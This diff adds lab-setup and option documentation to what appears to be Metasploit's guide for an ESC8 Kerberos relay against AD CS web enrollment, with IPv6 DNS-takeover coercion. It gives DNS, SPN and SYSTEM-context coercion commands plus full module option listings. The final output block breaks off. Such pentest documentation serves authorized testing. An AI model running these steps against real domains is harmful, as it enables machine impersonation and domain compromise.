@@ -35,6 +35,119 @@ with a coercion module. For the full end-to-end setup see the Scenarios section.
 6. Run the module and, in parallel, coerce the victim (see Scenarios)
 7. Wait for the Kerberos AP-REQ to be relayed and a certificate to be issued
 
+## Lab environment used to validate this module
+
+The relay half of this technique was validated against the following setup. The
+values are examples; substitute your own domain, hosts and addresses.
+
+### Domain controller and AD CS
+
+* Windows Server 2022, single domain `ad.example.com` (NetBIOS `AD`).
+* The `Active Directory Certificate Services` role with the `Certificate
+  Authority` and `Certificate Authority Web Enrollment` role services. Web
+  Enrollment is what publishes the `/certsrv/` endpoint this module relays to.
+* The CA and the KDC on the same host is fine. The coercion introduces a new
+  name rather than poisoning an existing one, so the victim keeps reaching the
+  KDC while its service connection is steered to the attacker.
+* No registry changes were required. ESC8 relies on the default HTTP Web
+  Enrollment endpoint being reachable without Extended Protection for
+  Authentication (channel binding); `SSL false` (the default) targets that HTTP
+  endpoint. If Web Enrollment is only bound to HTTPS in your environment, set
+  `SSL true` and `RPORT 443`, noting that EPA may then reject the relayed ticket.
+
+### Certificate template
+
+* The `Machine` template published on the CA (`Certificate Templates` console ->
+  the CA's `Certificate Templates` -> `New` -> `Certificate Template to Issue`).
+* The account you coerce must have `Enroll` on that template. For a machine
+  account coercion, grant the victim computer object (for example `WIN-VICTIM$`)
+  Read and Enroll on the `Machine` template. The default `Machine` template
+  builds its subject from Active Directory, so the certificate is issued to the
+  authenticated machine account regardless of the CSR subject.
+
+### SPN and DNS records for the coerced name
+
+The victim only sends a Kerberos AP-REQ if it requests a service ticket for a
+name whose SPN exists and whose DNS record points at the attacker. Two ways to
+arrange that:
+
+* Native coercion (the intended workflow): the paired DNS-takeover module
+  answers for the target domain and returns a `CNAME` (`RELAY_CNAME`) that steers
+  the victim onto a name the attacker serves, while the ticket is still minted
+  for the real target SPN. See the Scenarios section.
+* Manual decoy for a controlled lab test: create a name, point it at the
+  attacker, and register a matching SPN so a ticket is issued for it. From the
+  DC, as a domain admin:
+
+```
+# DNS: point a decoy name at the attacker box running this module
+Add-DnsServerResourceRecordA -ZoneName ad.example.com -Name relaytest -IPv4Address 192.0.2.50
+
+# SPN: register the CIFS SPN for that name on the coerced account (here the
+# victim machine account), so its ticket names the decoy
+setspn -s CIFS/relaytest.ad.example.com WIN-VICTIM$
+```
+
+### Coercing the machine account
+
+Machine-account Kerberos is what this module relays, so trigger the connection
+from a context that holds the machine account's TGT. Running as
+`NT AUTHORITY\SYSTEM` on the victim does this:
+
+```
+# in a cmd/powershell running as SYSTEM on the victim (e.g. via PsExec -s or a
+# SYSTEM scheduled task), touch the decoy over SMB:
+net use \\relaytest.ad.example.com\ipc$
+```
+
+That sends an SMB2 SessionSetup carrying a Kerberos AP-REQ as `WIN-VICTIM$`. A
+`net use` from an interactive administrator session instead authenticates as
+that user and, without a usable service ticket for the name, can fall back to
+NTLM, so use the SYSTEM (machine-account) context for a reliable machine-account
+relay. A SYSTEM scheduled task (`schtasks /ru SYSTEM`) is a convenient headless
+trigger.
+
+## Full module options
+
+Real output of `show options` for the module (defaults shown, with the coercion
+values from the Scenarios set):
+
+```
+msf auxiliary(server/relay/esc8_kerberos) > set RHOSTS ca.ad.example.com
+msf auxiliary(server/relay/esc8_kerberos) > set RELAY_IDENTITY AD\WIN-VICTIM$
+msf auxiliary(server/relay/esc8_kerberos) > set MODE SPECIFIC_TEMPLATE
+msf auxiliary(server/relay/esc8_kerberos) > set CERT_TEMPLATE Machine
+msf auxiliary(server/relay/esc8_kerberos) > options
+
+Module options (auxiliary/server/relay/esc8_kerberos):
+
+   Name                 Current Setting    Required  Description
+   ----                 ---------------    --------  -----------
+   ADD_CERT_APP_POLICY                     no        Add certificate application policy OIDs
+   ALT_DNS                                 no        Alternative certificate DNS
+   ALT_SID                                 no        Alternative object SID
+   ALT_UPN                                 no        Alternative certificate UPN (format: USER@DOMAIN)
+   CERT_TEMPLATE        Machine            no        The template to issue if MODE is SPECIFIC_TEMPLATE.
+   MODE                 SPECIFIC_TEMPLATE  yes       The issue mode. (Accepted: ALL, AUTO, QUERY_ONLY, SPECIFIC_TEMPLATE)
+   ON_BEHALF_OF                            no        Username to request on behalf of (format: DOMAIN\USER)
+   PFX                                     no        Certificate to request on behalf of
+   RELAY_IDENTITY       AD\WIN-VICTIM$     yes       The coerced principal being relayed, as DOMAIN\HOST$ or HOST$@realm.
+   RELAY_TIMEOUT        25                 yes       Seconds that the relay socket will wait for a response after the client has initiated communication.
+   RHOSTS               ca.ad.example.com  yes       Target address range or CIDR identifier to relay to
+   RPORT                80                 yes       The target port (TCP)
+   SMBDomain            WORKGROUP          yes       The domain name used during SMB exchange.
+   SRVHOST              0.0.0.0            yes       The local host or network interface to listen on.
+   SRVPORT              445                yes       The local port to listen on.
+   SSL                  false              no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI            /certsrv/          yes       The URI for the cert server.
+
+Auxiliary action:
+
+   Name   Description
+   ----   -----------
+   Relay  Run SMB ESC8 Kerberos relay server
+```
+
 ## Options
 
 ### MODE
@@ -104,9 +217,40 @@ msf auxiliary(spoof/ipv6/ipv6_ra_dns_takeover) > set RELAY_CNAME attacker.ad.exa
 msf auxiliary(spoof/ipv6/ipv6_ra_dns_takeover) > run
 ```
 
+Real output of `show options` for the coercion module (the Router Advertisement
+variant; the DHCPv6 module takes the same `TARGET_DOMAIN`/`SPOOF_IP6`/
+`RELAY_CNAME`):
+
+```
+Module options (auxiliary/spoof/ipv6/ipv6_ra_dns_takeover):
+
+   Name                     Current Setting          Required  Description
+   ----                     ---------------          --------  -----------
+   ADVERTISE_SEARCH_DOMAIN  true                     yes       Advertise TARGET_DOMAIN as a DNS search list (DNSSL) to steer short-name resolution.
+   BECOME_ROUTER            false                    yes       Also advertise as the default router (router lifetime > 0). Off by default for a DNS-only takeover.
+   INTERFACE                eth0                     no        The name of the interface
+   RA_INTERVAL              30                       yes       Seconds between unsolicited Router Advertisements.
+   RELAY_CNAME              attacker.ad.example.com  no        If set, poisoned names are answered with a CNAME to this name (the DNS-CNAME Kerberos relay trick) instead of a direct address.
+   RESPOND_TO_SOLICITS      true                     yes       Also reply to Router Solicitations with an immediate unicast RA.
+   SHOST                                             no        The source IPv6 address
+   SMAC                                              no        The source MAC address
+   SPOOF_IP6                dead:beef::5             yes       The attacker IPv6 address handed out as the DNS server and returned for poisoned names.
+   SRVHOST                  ::                       yes       The local host or network interface to listen on. Defaults to :: to receive the IPv6 DNS queries the victim is steered to send.
+   SRVPORT                  53                       yes       The local port to listen on.
+   TARGET_DOMAIN            ad.example.com           yes       The DNS domain to intercept; names under it are poisoned (e.g. ad.example.com).
+   TARGET_HOSTS                                      no        Specific FQDNs to poison (space or semicolon separated). If empty, all names under TARGET_DOMAIN are poisoned.
+
+Auxiliary action:
+
+   Name     Description
+   ----     -----------
+   Service  Run the RA/RDNSS and DNS takeover services
+```
+
 Once the victim resolves the target service through the attacker and
 authenticates to the attacker's SMB server, the relay server extracts the
-AP-REQ, replays it to the CA, and saves the issued certificate:
+AP-REQ, replays it to the CA, and saves the issued certificate. Representative
+output of a successful `run` (exact lines depend on the client and template):
 
 ```
 [*] New Kerberos request from 192.168.64.2
